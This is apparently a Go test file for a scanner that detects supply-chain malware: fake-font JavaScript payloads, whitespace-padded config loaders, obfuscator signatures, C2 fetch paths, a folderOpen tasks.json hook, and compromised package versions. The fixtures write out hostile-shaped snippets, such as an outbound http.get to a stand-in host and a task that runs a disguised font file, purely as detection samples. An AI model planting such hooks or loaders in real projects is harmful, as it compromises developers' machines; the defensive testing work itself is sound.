package main

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"testing"
	"time"
)

// findingsFor returns the findings whose Check matches name.
func findingsFor(s *Scanner, check string) []Finding {
	var out []Finding
	for _, f := range s.Findings {
		if f.Check == check {
			out = append(out, f)
		}
	}
	return out
}

func TestFakeFontPayload(t *testing.T) {
	dir := t.TempDir()
	fonts := filepath.Join(dir, "site", "public", "fonts")
	os.MkdirAll(fonts, 0755)

	// A fake font: JavaScript with a font's name and extension. Deliberately
	// carries no known signature, so this exercises the magic-number check on
	// its own — that is the property that survives constant rotation.
	os.WriteFile(filepath.Join(fonts, "fa-solid-400.woff2"),
		[]byte(`try{}catch(err){};var a=require("http");a.get("http://example.invalid/x");`), 0644)

	// A real WOFF2 font: correct magic, binary body.
	real := append([]byte("wOF2"), 0x00, 0x01, 0x00, 0x00, 0xff, 0xfe, 0x00, 0x42)
	os.WriteFile(filepath.Join(fonts, "inter-regular.woff2"), real, 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	hits := findingsFor(s, "fake-font-payload")
	if len(hits) != 1 {
		t.Fatalf("want exactly 1 fake-font-payload finding, got %d: %v", len(hits), hits)
	}
	if !strings.Contains(hits[0].Path, "fa-solid-400.woff2") {
		t.Errorf("flagged the wrong file: %s", hits[0].Path)
	}
}

func TestRealFontNotFlagged(t *testing.T) {
	dir := t.TempDir()
	fonts := filepath.Join(dir, "assets")
	os.MkdirAll(fonts, 0755)

	// One of each container format the check knows about.
	cases := map[string][]byte{
		"a.woff2": []byte("wOF2\x00\x01\x00\x00binary\xff\xfe"),
		"b.woff":  []byte("wOFF\x00\x01\x00\x00binary\xff\xfe"),
		"c.otf":   []byte("OTTO\x00\x04\x00\x60binary\xff\xfe"),
		"d.ttf":   {0x00, 0x01, 0x00, 0x00, 0x00, 0x0d, 0xff, 0xfe},
	}
	for name, data := range cases {
		os.WriteFile(filepath.Join(fonts, name), data, 0644)
	}

	s := New(dir, false)
	s.scanProjectDirs()

	if hits := findingsFor(s, "fake-font-payload"); len(hits) != 0 {
		t.Errorf("legitimate fonts flagged: %v", hits)
	}
}

func TestMirroredHTMLFontNotFlagged(t *testing.T) {
	// A site mirrored with wget saves the index page under the asset's name
	// when the asset 404s. The file genuinely is not font data, but it is not
	// an indicator of anything either.
	dir := t.TempDir()
	media := filepath.Join(dir, "mirror", "static", "media")
	os.MkdirAll(media, 0755)

	for name, body := range map[string]string{
		"Explorer.17007a59.otf": `<!doctype html><html lang="en"><head><meta charset="utf-8"/></head></html>`,
		"fallback.woff2":        "<html><body>404 Not Found</body></html>",
		"feed.ttf":              `<?xml version="1.0" encoding="UTF-8"?><rss></rss>`,
	} {
		os.WriteFile(filepath.Join(media, name), []byte(body), 0644)
	}

	s := New(dir, false)
	s.scanProjectDirs()

	if hits := findingsFor(s, "fake-font-payload"); len(hits) != 0 {
		t.Errorf("mirrored HTML saved as a font was flagged: %v", hits)
	}
}

func TestPayloadSignatureInConfig(t *testing.T) {
	dir := t.TempDir()
	proj := filepath.Join(dir, "myapp")
	os.MkdirAll(proj, 0755)

	// The injection shape: real config, padding, then the loader.
	poisoned := "export default {}" + strings.Repeat(" ", 280) + `;var _0x=("rmcej%otb%",2857687);`
	os.WriteFile(filepath.Join(proj, "postcss.config.mjs"), []byte(poisoned), 0644)

	// A clean config of the same name pattern must not be flagged.
	os.WriteFile(filepath.Join(proj, "tailwind.config.js"),
		[]byte("export default { content: ['./src/**/*.tsx'] };\n"), 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	hits := findingsFor(s, "payload-signature")
	if len(hits) != 1 {
		t.Fatalf("want exactly 1 payload-signature finding, got %d: %v", len(hits), hits)
	}
	if !strings.Contains(hits[0].Path, "postcss.config.mjs") {
		t.Errorf("flagged the wrong file: %s", hits[0].Path)
	}
}

func TestPayloadSignatureRotatedVariants(t *testing.T) {
	// Every documented generation of the loader must match, since the campaign
	// has already rotated its constants once and a stale signature list is how
	// a scan reports clean on a live infection.
	variants := map[string]string{
		"march.config.js":  `x;var _$_1e42=function(){};`,
		"april.config.js":  `x;var q="Cot%3t=shtP";`,
		"marker.config.js": `x;global['!']='8-270-2';`,
		"rotmk.config.js":  `x;global['_V']='8-311';`,
		"npmcs.config.cjs": `x;global.i="A8-3292-1";`,
	}

	for name, body := range variants {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			os.WriteFile(filepath.Join(dir, name), []byte(body), 0644)

			s := New(dir, false)
			s.scanProjectDirs()

			if hits := findingsFor(s, "payload-signature"); len(hits) != 1 {
				t.Errorf("variant %s not detected: got %d findings", name, len(hits))
			}
		})
	}
}

func TestPayloadSignatureNullReceiverResolver(t *testing.T) {
	// The C2-resolver constants from MAL-2026-11136 / MAL-2026-11132. Unlike
	// the obfuscator markers above these do not rotate: the wallet is compiled
	// into the payload, so changing it means republishing to every victim.
	// `plugin.js` is included as a carrier name because that is where
	// bianira-ui shipped its loader.
	variants := map[string]string{
		"wallet-lower.config.js": `x;const a="0xa322e5f3d311d3080e6f0121063e9adc2490ef1a";`,
		"wallet-eip55.config.js": `x;const a="0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a";`,
		"cls-path.config.js":     `x;fetch("http://"+h+"/0x/cls");`,
		"ls-path.config.js":      `x;fetch("http://"+h+"/0x/ls");`,
		"plugin.js":              `module.exports={};(function(){fetch("http://"+h+"/0x/cls")})();`,
	}

	for name, body := range variants {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			os.WriteFile(filepath.Join(dir, name), []byte(body), 0644)

			s := New(dir, false)
			s.scanProjectDirs()

			if hits := findingsFor(s, "payload-signature"); len(hits) != 1 {
				t.Errorf("variant %s not detected: got %d findings", name, len(hits))
			}
		})
	}
}

func TestPluginJSCleanNotFlagged(t *testing.T) {
	// plugin.js is a common filename in the JS ecosystem. Widening the read
	// set to include it must not turn an ordinary one into a finding.
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "plugin.js"),
		[]byte("module.exports = function plugin() { return { name: 'demo' }; };\n"), 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	for _, check := range []string{"payload-signature", "padded-source-file"} {
		if hits := findingsFor(s, check); len(hits) != 0 {
			t.Errorf("clean plugin.js produced %s findings: %v", check, hits)
		}
	}
}

func TestPaddedSourceFileWarnsWithoutSignature(t *testing.T) {
	dir := t.TempDir()

	// Padding but no known signature: this is what a rotation past our
	// signature list looks like, so it warns rather than staying silent.
	os.WriteFile(filepath.Join(dir, "vite.config.ts"),
		[]byte("export default {}"+strings.Repeat(" ", 300)+";var unknownLoader=1;"), 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	hits := findingsFor(s, "padded-source-file")
	if len(hits) != 1 {
		t.Fatalf("want 1 padded-source-file finding, got %d: %v", len(hits), hits)
	}
	if hits[0].Severity != SevWarn {
		t.Errorf("padding-only detection should be WARN, got %v", hits[0].Severity)
	}
}

func TestBinaryFontWithSpaceRunNotFlagged(t *testing.T) {
	// Regression: a legitimate 21 MB CJK TrueType font was flagged as
	// padded-source-file because its glyph tables happened to contain 200
	// consecutive 0x20 bytes. Hiding a payload off the right edge of an editor
	// is a trick that only means anything in text; in a binary container a run
	// of spaces is just data.
	dir := t.TempDir()

	font := []byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x80}
	font = append(font, []byte(strings.Repeat(" ", 400))...)
	font = append(font, 0x00, 0xff, 0xfe, 0x00)
	os.WriteFile(filepath.Join(dir, "MicrosoftJhengHei.ttf"), font, 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	if hits := findingsFor(s, "padded-source-file"); len(hits) != 0 {
		t.Errorf("legitimate binary font with a space run flagged: %v", hits)
	}
	if hits := findingsFor(s, "fake-font-payload"); len(hits) != 0 {
		t.Errorf("legitimate binary font flagged as a fake font: %v", hits)
	}
}

func TestPaddedFakeFontStillFlagged(t *testing.T) {
	// The inverse of the above: a font-named file that really is text must
	// still be caught, as a critical finding.
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "fa-solid-400.woff2"),
		[]byte("var a=1;"+strings.Repeat(" ", 300)+"var payload=2;"), 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	if hits := findingsFor(s, "fake-font-payload"); len(hits) != 1 {
		t.Fatalf("text-bearing fake font not detected: got %d findings", len(hits))
	}
}

func TestPaddedSourceFileNotDoubleReported(t *testing.T) {
	dir := t.TempDir()

	// Padding AND a known signature: report the signature (critical), not the
	// heuristic, so one injection produces one finding.
	os.WriteFile(filepath.Join(dir, "next.config.mjs"),
		[]byte("export default {}"+strings.Repeat(" ", 300)+`;var x="rmcej%otb%";`), 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	if hits := findingsFor(s, "payload-signature"); len(hits) != 1 {
		t.Errorf("want 1 payload-signature finding, got %d", len(hits))
	}
	if hits := findingsFor(s, "padded-source-file"); len(hits) != 0 {
		t.Errorf("padding warning should be suppressed when a signature matched: %v", hits)
	}
}

func TestMaliciousRepoArtifacts(t *testing.T) {
	dir := t.TempDir()
	proj := filepath.Join(dir, "repo")
	os.MkdirAll(proj, 0755)

	os.WriteFile(filepath.Join(proj, "temp_auto_push.bat"), []byte("@echo off"), 0644)
	os.WriteFile(filepath.Join(proj, "config.bat"), []byte("@echo off"), 0644)
	os.WriteFile(filepath.Join(proj, "main.inz.cjs"), []byte("require('./x')"), 0644)

	// A legitimate batch file must not be flagged on extension alone.
	os.WriteFile(filepath.Join(proj, "build.bat"), []byte("@echo off"), 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	hits := findingsFor(s, "malicious-repo-artifact")
	if len(hits) != 3 {
		t.Fatalf("want 3 malicious-repo-artifact findings, got %d: %v", len(hits), hits)
	}
	for _, f := range hits {
		if strings.Contains(f.Path, "build.bat") {
			t.Errorf("legitimate build.bat flagged: %v", f)
		}
	}
}

func TestGitignoreInjection(t *testing.T) {
	dir := t.TempDir()
	proj := filepath.Join(dir, "repo")
	os.MkdirAll(proj, 0755)
	os.WriteFile(filepath.Join(proj, ".gitignore"),
		[]byte("node_modules\ndist\nconfig.bat\n"), 0644)

	clean := filepath.Join(dir, "cleanrepo")
	os.MkdirAll(clean, 0755)
	os.WriteFile(filepath.Join(clean, ".gitignore"),
		[]byte("node_modules\n*.log\n"), 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	hits := findingsFor(s, "gitignore-injection")
	if len(hits) != 1 {
		t.Fatalf("want 1 gitignore-injection finding, got %d: %v", len(hits), hits)
	}
	if strings.Contains(hits[0].Path, "cleanrepo") {
		t.Errorf("clean .gitignore flagged: %v", hits[0])
	}
}

func TestVscodeTasksJSONIsScanned(t *testing.T) {
	// The walk stops descending at `.vscode`, so this guards the explicit
	// same-directory file scan — without it the loader itself is never read.
	dir := t.TempDir()
	vscode := filepath.Join(dir, "proj", ".vscode")
	os.MkdirAll(vscode, 0755)

	tasks := `{"version":"2.0.0","tasks":[{"label":"eslint-check","type":"shell",` +
		`"command":"node ./public/fonts/fa-solid-400.woff2","runOptions":{"runOn":"folderOpen"}}]}` +
		strings.Repeat(" ", 300) + `//global.i="A8-3292-1"`

	os.WriteFile(filepath.Join(vscode, "tasks.json"), []byte(tasks), 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	hits := findingsFor(s, "payload-signature")
	if len(hits) != 1 {
		t.Fatalf("want 1 payload-signature finding in .vscode/tasks.json, got %d: %v", len(hits), hits)
	}
}

func TestPatchedNpmCLI(t *testing.T) {
	dir := t.TempDir()
	npmLib := filepath.Join(dir, "node_modules", "npm", "lib")
	os.MkdirAll(npmLib, 0755)

	// ~1 MB overwritten CLI.
	big := make([]byte, NpmCLIMaxNormalBytes+1)
	for i := range big {
		big[i] = ' '
	}
	os.WriteFile(filepath.Join(npmLib, "cli.js"), big, 0644)

	s := New(dir, false)
	s.checkNpmCLI()

	hits := findingsFor(s, "patched-npm-cli")
	if len(hits) != 1 {
		t.Fatalf("want 1 patched-npm-cli finding, got %d: %v", len(hits), hits)
	}
}

func TestGenuineNpmCLINotFlagged(t *testing.T) {
	dir := t.TempDir()
	npmLib := filepath.Join(dir, "node_modules", "npm", "lib")
	os.MkdirAll(npmLib, 0755)

	// The real thing: four lines, a few hundred bytes.
	os.WriteFile(filepath.Join(npmLib, "cli.js"), []byte(
		"const cli = require('../lib/cli.js')\nmodule.exports = cli\n"), 0644)

	s := New(dir, false)
	s.checkNpmCLI()

	if hits := findingsFor(s, "patched-npm-cli"); len(hits) != 0 {
		t.Errorf("genuine npm cli.js flagged: %v", hits)
	}
}

func TestNpmCLISmallButSigned(t *testing.T) {
	dir := t.TempDir()
	npmLib := filepath.Join(dir, "node_modules", "npm", "lib")
	os.MkdirAll(npmLib, 0755)

	// Under the size threshold but carrying a known signature.
	os.WriteFile(filepath.Join(npmLib, "cli.js"),
		[]byte("const cli = require('../lib/cli.js')\n/*"+`global.i="A8-3292-2"`+"*/\n"), 0644)

	s := New(dir, false)
	s.checkNpmCLI()

	if hits := findingsFor(s, "patched-npm-cli"); len(hits) != 1 {
		t.Errorf("signed-but-small npm cli.js not detected: got %d findings", len(hits))
	}
}

func TestPolinRiderNpmVersion(t *testing.T) {
	dir := t.TempDir()
	pkgDir := filepath.Join(dir, "proj", "node_modules", "fetch-page-assets")
	os.MkdirAll(pkgDir, 0755)
	// 1.2.14 is live and unflagged on npm — the case exactly.
	writePackageJSON(t, pkgDir, "fetch-page-assets", "1.2.14")

	cleanDir := filepath.Join(dir, "proj", "node_modules", "fetch-page-assets-ok")
	os.MkdirAll(cleanDir, 0755)
	writePackageJSON(t, cleanDir, "fetch-page-assets", "1.2.8")

	s := New(dir, false)
	s.scanProjectDirs()

	hits := findingsFor(s, "compromised-version")
	if len(hits) != 1 {
		t.Fatalf("want 1 compromised-version finding, got %d: %v", len(hits), hits)
	}
	if !strings.Contains(hits[0].Detail, "1.2.14") {
		t.Errorf("unexpected detail: %s", hits[0].Detail)
	}
}

func TestPolinRiderSecurityPlaceholderNotFlagged(t *testing.T) {
	// npm publishes `0.0.1-security` as the clean stub after a takedown.
	// Flagging it would report the remediation as the compromise.
	dir := t.TempDir()
	pkgDir := filepath.Join(dir, "proj", "node_modules", "tailwind-scrollbar-hider")
	os.MkdirAll(pkgDir, 0755)
	writePackageJSON(t, pkgDir, "tailwind-scrollbar-hider", "0.0.1-security")

	s := New(dir, false)
	s.scanProjectDirs()

	if hits := findingsFor(s, "compromised-version"); len(hits) != 0 {
		t.Errorf("npm security placeholder flagged: %v", hits)
	}
}

func TestPolinRiderPhantomPackage(t *testing.T) {
	dir := t.TempDir()
	pkgDir := filepath.Join(dir, "proj", "node_modules", "tailwindcss-style-animate")
	os.MkdirAll(pkgDir, 0755)
	writePackageJSON(t, pkgDir, "tailwindcss-style-animate", "1.1.6")

	s := New(dir, false)
	s.scanProjectDirs()

	if hits := findingsFor(s, "phantom-dependency"); len(hits) != 1 {
		t.Errorf("PolinRider typosquat not detected as phantom: got %d findings", len(hits))
	}
}

func TestPolinRiderComposerDevBranch(t *testing.T) {
	// Most PolinRider Packagist artifacts are `dev-*` branch refs rather than
	// tagged releases, because the worm force-pushes into tracked branches.
	dir := t.TempDir()
	composerDir := filepath.Join(dir, "php-app", "vendor", "composer")
	os.MkdirAll(composerDir, 0755)

	installed := `{"packages":[` +
		`{"name":"visanduma/nova-two-factor","version":"dev-nova5"},` +
		`{"name":"sevenspan/laravel-chat","version":"1.5.2"},` +
		`{"name":"symfony/console","version":"6.4.0"}]}`
	os.WriteFile(filepath.Join(composerDir, "installed.json"), []byte(installed), 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	hits := findingsFor(s, "compromised-composer-version")
	if len(hits) != 2 {
		t.Fatalf("want 2 composer findings, got %d: %v", len(hits), hits)
	}
	for _, f := range hits {
		if strings.Contains(f.Detail, "symfony/console") {
			t.Errorf("clean package flagged: %v", f)
		}
	}
}

func TestPolinRiderPythonVersion(t *testing.T) {
	dir := t.TempDir()
	sp := filepath.Join(dir, "venv", "lib", "python3.12", "site-packages")
	os.MkdirAll(filepath.Join(sp, "pybitjs-0.1.0.dist-info"), 0755)
	os.MkdirAll(filepath.Join(sp, "requests-2.31.0.dist-info"), 0755)

	s := New(dir, false)
	s.scanPythonPackages()

	hits := findingsFor(s, "compromised-python-version")
	if len(hits) != 1 {
		t.Fatalf("want 1 compromised-python-version finding, got %d: %v", len(hits), hits)
	}
	if !strings.Contains(hits[0].Detail, "pybitjs") {
		t.Errorf("unexpected detail: %s", hits[0].Detail)
	}
}

func TestCleanProjectNoContentFindings(t *testing.T) {
	// A realistic clean project: build configs, a real font, a normal
	// .gitignore, a legitimate folderOpen task. None of it may be flagged.
	dir := t.TempDir()
	proj := filepath.Join(dir, "webapp")
	os.MkdirAll(filepath.Join(proj, "public", "fonts"), 0755)
	os.MkdirAll(filepath.Join(proj, ".vscode"), 0755)

	os.WriteFile(filepath.Join(proj, "vite.config.ts"),
		[]byte("import {defineConfig} from 'vite';\nexport default defineConfig({});\n"), 0644)
	os.WriteFile(filepath.Join(proj, "tailwind.config.js"),
		[]byte("module.exports = { content: [] };\n"), 0644)
	os.WriteFile(filepath.Join(proj, "index.js"),
		[]byte("console.log('hi');\n"), 0644)
	os.WriteFile(filepath.Join(proj, ".gitignore"),
		[]byte("node_modules\ndist\n.env\n"), 0644)
	os.WriteFile(filepath.Join(proj, "public", "fonts", "inter.woff2"),
		append([]byte("wOF2"), 0x00, 0x01, 0x00, 0x00, 0xde, 0xad), 0644)
	os.WriteFile(filepath.Join(proj, ".vscode", "tasks.json"),
		[]byte(`{"version":"2.0.0","tasks":[{"label":"watch","type":"npm","script":"dev","runOptions":{"runOn":"folderOpen"}}]}`), 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	for _, check := range []string{
		"fake-font-payload", "payload-signature", "padded-source-file",
		"malicious-repo-artifact", "gitignore-injection",
	} {
		if hits := findingsFor(s, check); len(hits) != 0 {
			t.Errorf("clean project produced %s findings: %v", check, hits)
		}
	}
}

// A named pipe with no writer blocks forever on open/read — the closest
// faithful stand-in for an offline cloud placeholder that never materializes.
func mkHangingFile(t *testing.T, path string) {
	t.Helper()
	if runtime.GOOS == "windows" {
		t.Skip("FIFOs are not available on Windows")
	}
	if err := syscall.Mkfifo(path, 0644); err != nil {
		t.Skipf("cannot create FIFO: %v", err)
	}
}

func TestReadTimesOutRatherThanHanging(t *testing.T) {
	dir := t.TempDir()
	mkHangingFile(t, filepath.Join(dir, "stuck.config.js"))

	s := New(dir, false)
	start := time.Now()
	data := s.readCapped(filepath.Join(dir, "stuck.config.js"))
	elapsed := time.Since(start)

	if data != nil {
		t.Error("expected nil from a read that cannot complete")
	}
	if elapsed > ReadTimeout*2 {
		t.Errorf("read took %s, expected to give up near %s", elapsed, ReadTimeout)
	}
	if s.stats.FilesUnreadable != 1 {
		t.Errorf("timeout not counted: got %d", s.stats.FilesUnreadable)
	}
	if len(findingsFor(s, "scan-incomplete")) != 1 {
		t.Fatal("single timeout reported clean")
	}
}

func TestStalledSubtreeAbandonedAndReported(t *testing.T) {
	dir := t.TempDir()
	sub := filepath.Join(dir, "Library", "CloudStorage", "Dropbox", "repo")
	os.MkdirAll(sub, 0755)

	// More hanging files than the threshold. Only the first StallThreshold may
	// actually cost a timeout; the rest must be skipped instantly.
	const total = 8
	for i := range total {
		mkHangingFile(t, filepath.Join(sub, fmt.Sprintf("a%d.config.js", i)))
	}

	s := New(dir, false)
	start := time.Now()
	s.scanProjectDirs()
	elapsed := time.Since(start)

	budget := ReadTimeout * (StallThreshold + 1)
	if elapsed > budget {
		t.Errorf("scan took %s; breaker should have capped it near %s", elapsed, ReadTimeout*StallThreshold)
	}
	if s.stats.FilesUnreadable != total {
		t.Errorf("want all %d files counted unreadable, got %d", total, s.stats.FilesUnreadable)
	}

	hits := findingsFor(s, "scan-incomplete")
	if len(hits) != 1 {
		t.Fatalf("want exactly 1 scan-incomplete finding, got %d: %v", len(hits), hits)
	}
	if hits[0].Severity != SevWarn {
		t.Errorf("scan-incomplete should be WARN, got %v", hits[0].Severity)
	}
	if !strings.HasSuffix(hits[0].Path, filepath.Join("Library", "CloudStorage", "Dropbox")) {
		t.Errorf("finding should name the sync root, got %s", hits[0].Path)
	}
}

func TestStallInOneSubtreeDoesNotBlockAnother(t *testing.T) {
	dir := t.TempDir()

	bad := filepath.Join(dir, "Library", "CloudStorage", "Dropbox")
	os.MkdirAll(bad, 0755)
	for i := range StallThreshold + 2 {
		mkHangingFile(t, filepath.Join(bad, fmt.Sprintf("b%d.config.js", i)))
	}

	// A healthy project elsewhere must still be scanned.
	good := filepath.Join(dir, "src", "app")
	os.MkdirAll(good, 0755)
	os.WriteFile(filepath.Join(good, "postcss.config.mjs"),
		[]byte(`x;var q="Cot%3t=shtP";`), 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	if hits := findingsFor(s, "payload-signature"); len(hits) != 1 {
		t.Errorf("healthy subtree was not scanned: got %d payload-signature findings", len(hits))
	}
	if hits := findingsFor(s, "scan-incomplete"); len(hits) != 1 {
		t.Errorf("want 1 scan-incomplete finding, got %d", len(hits))
	}
}

func TestDeepScanReadsInsideNodeModules(t *testing.T) {
	// The default scan identifies dependencies by name and version and never
	// opens their files. A package carrying the loader in a version nobody has
	// pinned is therefore invisible until -deep is set.
	dir := t.TempDir()
	pkg := filepath.Join(dir, "proj", "node_modules", "some-ui-kit", "src")
	if err := os.MkdirAll(pkg, 0755); err != nil {
		t.Fatal(err)
	}
	os.WriteFile(filepath.Join(pkg, "index.js"),
		[]byte(`module.exports={};var w="0xa322e5f3d311d3080e6f0121063e9adc2490ef1a";`), 0644)

	shallow := New(dir, false)
	shallow.scanProjectDirs()
	if hits := findingsFor(shallow, "payload-signature"); len(hits) != 0 {
		t.Errorf("default scan read inside node_modules: %v", hits)
	}

	deep := New(dir, false)
	deep.Deep = true
	deep.scanProjectDirs()
	if hits := findingsFor(deep, "payload-signature"); len(hits) != 1 {
		t.Fatalf("deep scan missed the payload inside node_modules: got %d", len(hits))
	}
}

func TestDeepScanReadsInsideComposerVendor(t *testing.T) {
	dir := t.TempDir()
	vendor := filepath.Join(dir, "proj", "vendor")
	if err := os.MkdirAll(filepath.Join(vendor, "composer"), 0755); err != nil {
		t.Fatal(err)
	}
	os.WriteFile(filepath.Join(vendor, "composer", "installed.json"), []byte(`{"packages":[]}`), 0644)
	os.MkdirAll(filepath.Join(vendor, "acme", "pkg"), 0755)
	os.WriteFile(filepath.Join(vendor, "acme", "pkg", "index.js"),
		[]byte(`x;var q="Cot%3t=shtP";`), 0644)

	shallow := New(dir, false)
	shallow.scanProjectDirs()
	if hits := findingsFor(shallow, "payload-signature"); len(hits) != 0 {
		t.Errorf("default scan read inside vendor/: %v", hits)
	}

	deep := New(dir, false)
	deep.Deep = true
	deep.scanProjectDirs()
	if hits := findingsFor(deep, "payload-signature"); len(hits) != 1 {
		t.Errorf("deep scan missed the payload inside vendor/: got %d", len(hits))
	}
}

func TestShaiHuludPayloadNamesMatchAnywhere(t *testing.T) {
	// These were previously only looked for under the scopes already known to
	// be hit, which is backwards for a self-spreading worm.
	for _, name := range []string{"router_init.js", "tanstack_runner.js", "Math_Symbol.js"} {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			proj := filepath.Join(dir, "unrelated-project")
			os.MkdirAll(proj, 0755)
			os.WriteFile(filepath.Join(proj, name), []byte("payload"), 0644)

			s := New(dir, false)
			s.scanProjectDirs()

			if hits := findingsFor(s, "malicious-repo-artifact"); len(hits) != 1 {
				t.Errorf("%s outside a known scope was not flagged: got %d", name, len(hits))
			}
		})
	}
}

func TestSetupMjsNotMatchedAnywhere(t *testing.T) {
	// Deliberately left scoped: a plausible filename for a legitimate package.
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "setup.mjs"), []byte("export default {}"), 0644)

	s := New(dir, false)
	s.scanProjectDirs()

	if hits := findingsFor(s, "malicious-repo-artifact"); len(hits) != 0 {
		t.Errorf("setup.mjs was matched as a repo artifact: %v", hits)
	}
}

func TestLargeRecognizedFontNeedsOnlyHeader(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "large.woff2")
	os.WriteFile(path, append([]byte("wOF2"), make([]byte, SignatureScanMaxBytes+1)...), 0644)
	s := New(root, false)
	data := s.readCapped(path)
	if len(data) != 32 {
		t.Fatalf("read %d bytes of recognized font", len(data))
	}
	s.checkSourceFile(path, "large.woff2")
	if len(s.Findings) != 0 {
		t.Fatalf("recognized font produced findings: %+v", s.Findings)
	}
}

func TestTextFontStillScansBeyondHeader(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "fake.woff2")
	os.WriteFile(path, []byte(strings.Repeat(" ", 100)+"/*RS260605*/"), 0644)
	s := New(root, false)
	s.checkSourceFile(path, "fake.woff2")
	if len(findingsFor(s, "fake-font-payload")) != 1 || len(findingsFor(s, "payload-signature")) != 1 {
		t.Fatalf("fake font missed: %+v", s.Findings)
	}
}

func TestPaddingIgnoresIndentedLicenseAndTrailingWhitespace(t *testing.T) {
	spaces := strings.Repeat(" ", 244)
	for _, content := range []string{
		"/*\n" + spaces + "Copyright (C) Example\n" + spaces + "Redistribution permitted\n" + spaces + "*/\n",
		"export default {};" + spaces + "\n",
		spaces + "const deeplyIndented = true;\n",
		"// comment\r\n" + spaces + "// another comment\r\n",
	} {
		s := New(t.TempDir(), false)
		s.checkPadding("index.js", ".js", false, []byte(content))
		if len(s.Findings) != 0 {
			t.Fatalf("formatting flagged: %+v", s.Findings)
		}
	}
	if !hasInlinePadding([]byte("export default {};" + spaces + "unknownLoader();")) {
		t.Fatal("off-screen appended code missed")
	}
}
